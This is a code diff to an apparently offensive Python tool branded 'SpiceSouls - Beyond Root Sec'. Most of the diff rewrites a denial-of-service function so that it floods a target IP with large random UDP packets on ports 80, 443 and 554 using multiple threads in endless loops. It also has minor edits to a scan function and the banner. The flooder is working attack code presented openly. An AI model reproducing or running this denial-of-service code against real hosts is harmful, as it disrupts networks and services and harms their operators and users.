@@ -41,7 +41,7 @@ def scan():
 				pass
 		except requests.exceptions.ConnectionError:
 			pass
-			
+
 	try:
 		def threader():
 			while True:
@@ -191,23 +191,42 @@ def dos():
 	ip = args.ip
 	ports = [80, 443, 554]
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	info("Making Bogus Data...")
+	#info("Making Bogus Data...")
 	bogusdata = random._urandom(64900)
 	info("Starting DOS In 5 Seconds...")
 	time.sleep(5)
-	sent = 0
 	print("Press CNTRL + C At Anytime to Stop the Attack.")
 	try:
-		while True:
-			print("Sending Bogus Data to Ports On " + ip + "...")
-			print("----------------------")
-			for port in ports:
+		def dosprint():
+			while True:
+				dots = 4
+				for dotcount in range(dots):
+					print("\rSending Bogus Data to " + ip + str("." * dotcount) + " " * int(dots - dotcount), end='', flush=True)
+					time.sleep(0.3)
+		
+		ta = threading.Thread(target=dosprint)
+		ta.daemon = True
+		ta.start()
+		def senddos(port):
+			while True:
 				s.sendto(bogusdata, (ip,port))
-				sent += 1
-				print("Sent Bogus Data -> " + str(port))
-			print("\nSent " + Style.BRIGHT + str(sent) + Style.RESET_ALL + " Packets")
-			print("----------------------\n")
+				
+		def threader():
+			while True:
+				worker = q.get()
+				senddos(worker)
+				q.task_done()
+		q = Queue()
+		for a in range(args.t):
+			t = threading.Thread(target=threader)
+			t.daemon = True
+			t.start()
+		for worker in ports:
+			q.put(worker)
+		q.join()
+
 	except KeyboardInterrupt:
+		print("")
 		info("Stopping...")
 		sys.exit()
 
@@ -246,7 +265,7 @@ banner = fr'''
 {Fore.BLUE}██╔══██╗██╔══╝  ██║   ██║{Fore.RED}╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
 {Fore.BLUE}██║  ██║███████╗╚██████╔╝{Fore.RED}███████║██║     ███████╗╚██████╔╝██║   ██║   
 {Fore.BLUE}╚═╝  ╚═╝╚══════╝ ╚═════╝ {Fore.RED}╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
-{green}SpiceSouls - Beyond Root Sec - V1.1.0
+{green}SpiceSouls - Beyond Root Sec - V1.1.2
 {Fore.RESET}{Style.RESET_ALL}'''
 
 print(banner)
